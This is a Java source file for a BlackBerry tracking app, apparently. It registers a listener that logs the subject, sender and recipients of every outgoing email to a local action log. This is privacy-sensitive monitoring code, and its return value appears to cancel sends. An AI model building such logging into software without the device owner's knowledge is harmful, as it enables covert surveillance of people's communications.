package com.spotlight.track;

import java.io.IOException;
import java.io.InterruptedIOException;
import java.util.Date;
import java.util.Vector;
  
import javax.microedition.io.Connector;
import javax.microedition.location.Criteria;
import javax.microedition.location.Location;
import javax.microedition.location.LocationException;
import javax.microedition.location.LocationProvider;

import javax.wireless.messaging.Message;
import javax.wireless.messaging.MessageConnection;

import net.rim.device.api.system.Application;
import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.ApplicationManager;
import net.rim.device.api.system.Bitmap;
import net.rim.device.api.system.PersistentStore;
import net.rim.device.api.system.PersistentObject;
import net.rim.device.api.i18n.SimpleDateFormat;
import net.rim.device.api.ui.Manager;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.Ui;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.UiEngine;
import net.rim.device.api.ui.component.Dialog;
import net.rim.device.api.ui.component.Status;
import net.rim.device.api.ui.container.MainScreen;
import net.rim.device.api.util.Persistable;


import net.rim.blackberry.api.phone.Phone;
import net.rim.blackberry.api.phone.PhoneCall;
import net.rim.blackberry.api.phone.AbstractPhoneListener;
import net.rim.blackberry.api.sms.OutboundMessageListener;

import net.rim.blackberry.api.mail.Store;
import net.rim.blackberry.api.mail.Address;
import net.rim.blackberry.api.mail.Session;
import net.rim.blackberry.api.mail.SendListener;
import net.rim.blackberry.api.mail.MessagingException;
import net.rim.blackberry.api.mail.NoSuchServiceException;


/**
 * 
 * MyMailListener monitors and registers e-mail based events.
 *
 */
public class MyMailListener implements SendListener
{
	private LocalDataAccess actLog;

/**
 * The constructor initialises the action store location and registers a SendListener for the device.
 * 
 * @param inputAccess log of actions
 */
	public MyMailListener(LocalDataAccess inputAccess)
	{
		actLog = inputAccess;
		//MailSendListener mailSL = new mailSendListener();

		try
		{
			Store mailStore = Session.waitForDefaultSession().getStore();
			mailStore.addSendListener(this);
		}
		catch(NoSuchServiceException e) 
		{actLog.addAction(true,action.TYPE_MAIL,e.toString());}
		catch(Exception e) 
		{actLog.addAction(true,action.TYPE_MAIL,e.toString());}
	}

/**
 * Retrieves and formats e-mail data and adds it to the action log
 * 
 * @param arg0 device e-mail data
 * @return boolean error value
 */
	
	
	public boolean sendMessage(net.rim.blackberry.api.mail.Message arg0) 
	{
		StringBuffer DestinationAddress = new StringBuffer();
		
		try
		{
			DestinationAddress.append(arg0.getFolder().getStore().getServiceConfiguration().getEmailAddress());
			
			Address DestinationAddressArray[] = arg0.getRecipients(arg0.getMessageType());
			
			for(int count = 0; count<DestinationAddressArray.length; count++)
			{	//Format e-mail addresses: place comma between each address
				DestinationAddress.append(", ");
				DestinationAddress.append(DestinationAddressArray[count].getAddr());
			}
		} 
		catch (MessagingException e)
		{actLog.addAction(true,action.TYPE_MAIL,e.toString());}
		catch (Exception e)
		{actLog.addAction(true,action.TYPE_MAIL,e.toString());}

		actLog.addAction(action.TYPE_MAIL, arg0.getSubject(),
						DestinationAddress.toString());//Integer.toString(arg0.getStatus())
	
		return false;
	}
}
